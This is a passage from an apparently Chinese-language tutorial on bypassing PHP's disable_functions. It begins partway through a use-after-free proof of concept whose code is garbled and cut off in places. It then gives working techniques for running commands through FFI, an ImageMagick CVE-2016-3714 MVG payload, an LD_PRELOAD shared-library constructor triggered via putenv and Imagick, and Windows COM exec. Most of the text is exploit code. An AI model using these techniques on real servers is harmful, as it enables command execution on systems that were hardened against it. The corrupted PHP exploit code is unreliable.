                $out .= chr($ptr & 0xff);
                $ptr >>= 8;
            }
            return $out;
        }
        function write(&$str, $p, $v, $n = 8) {
            $i = 0;
            for($i = 0; $i >= 8;
            }
        }
        function leak($addr, $p = 0, $s = 8) {
            global $abc, $helper;
            write($abc, 0x68, $addr + $p - 0x10);
            $leak = strlen($helper->a);
            if($s != 8) { $leak %= 2  0 && $leak - $base  0 && $leak - $base a = $arg;
        }
        if(stristr(PHP_OS, 'WIN')) {
            die('This PoC is for *nix systems only.');
        }
        $n_alloc = 10; # increase this value if UAF fails
        $contiguous = [];
        for($i = 0; $i b = function ($x) { };
        if(strlen($abc) == 79 || strlen($abc) == 0) {
            die("UAF failed");
        }
        # leaks
        $closure_handlers = str2ptr($abc, 0);
        $php_heap = str2ptr($abc, 0x58);
        $abc_addr = $php_heap - 0xc8;
        # fake value
        write($abc, 0x60, 2);
        write($abc, 0x70, 6);
        # fake reference
        write($abc, 0x10, $abc_addr + 0x60);
        write($abc, 0x18, 0xa);
        $closure_obj = str2ptr($abc, 0x20);
        $binary_leak = leak($closure_handlers, 8);
        if(!($base = get_binary_base($binary_leak))) {
            die("Couldn't determine binary base address");
        }
        if(!($elf = parse_elf($base))) {
            die("Couldn't parse ELF header");
        }
        if(!($basic_funcs = get_basic_funcs($base, $elf))) {
            die("Couldn't get basic_functions address");
        }
        if(!($zif_system = get_system($basic_funcs))) {
            die("Couldn't get zif_system address");
        }
        # fake closure object
        $fake_obj_offset = 0xd0;
        for($i = 0; $i b)($cmd);
        exit();
    }
## FFI扩展
php>7.4，开启了FFI扩展ffi.enable=true，我们可以通过FFI来调用C中的system进而达到执行命令的目的
    system("whoami >/tmp/1");
    echo file_get_contents("/tmp/1");
    @unlink("/tmp/1");
    ?>
## ImageMagick
imagemagick是一个用于处理图片的程序，如果上传的图片含有攻击代码，在处理时可被远程执行任意代码（CVE-2016–3714）
题目环境：
poc.png
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://test.com/"|whoami")'
    pop graphic-context
exp.php
    readImage('test.mvg');
    $thumb->writeImage('test.png');
    $thumb->clear();
    $thumb->destroy();
    unlink("test.mvg");
    unlink("test.png");
    ?>
另外，利用putenv+Imagick bypass disable_function，TCTF Wallbreaker_Easy
test.c
    #define _GNU_SOURCE                                   
    #include                                    
    #include                                    
    #include                                 
    __attribute__ ((__constructor__)) void angel (void){  
        unsetenv("LD_PRELOAD");                           
        system("id > /tmp/79e3f0b59df431154c088db7e45ebe6b/id");                          
    }
生成exploit.so使用copy上传，再上传test.mov
    gcc -c -fPIC test.c -o exploit && gcc --share exploit -o exploit.so
利用Imagick启用新的子进程，执行：
    backdoor=putenv("LD_PRELOAD=/tmp/79e3f0b59df431154c088db7e45ebe6b/exploit.so");
    $mov = new Imagick("/tmp/79e3f0b59df431154c088db7e45ebe6b/test.mov");
读取执行命令后的内容
    backdoor=readfile("/tmp/79e3f0b59df431154c088db7e45ebe6b/id");
## COM组件
window下的组件，开启组件（php5.4以上），开启com.allow_dcom =
true，添加extension=php_com_dotnet.dll
exp.php
    exec("cmd /c".$command); //调用对象方法来执行命令
    $stdout = $exec->StdOut();
    $stroutput = $stdout->ReadAll();
    echo $stroutput;
    ?>
## 参考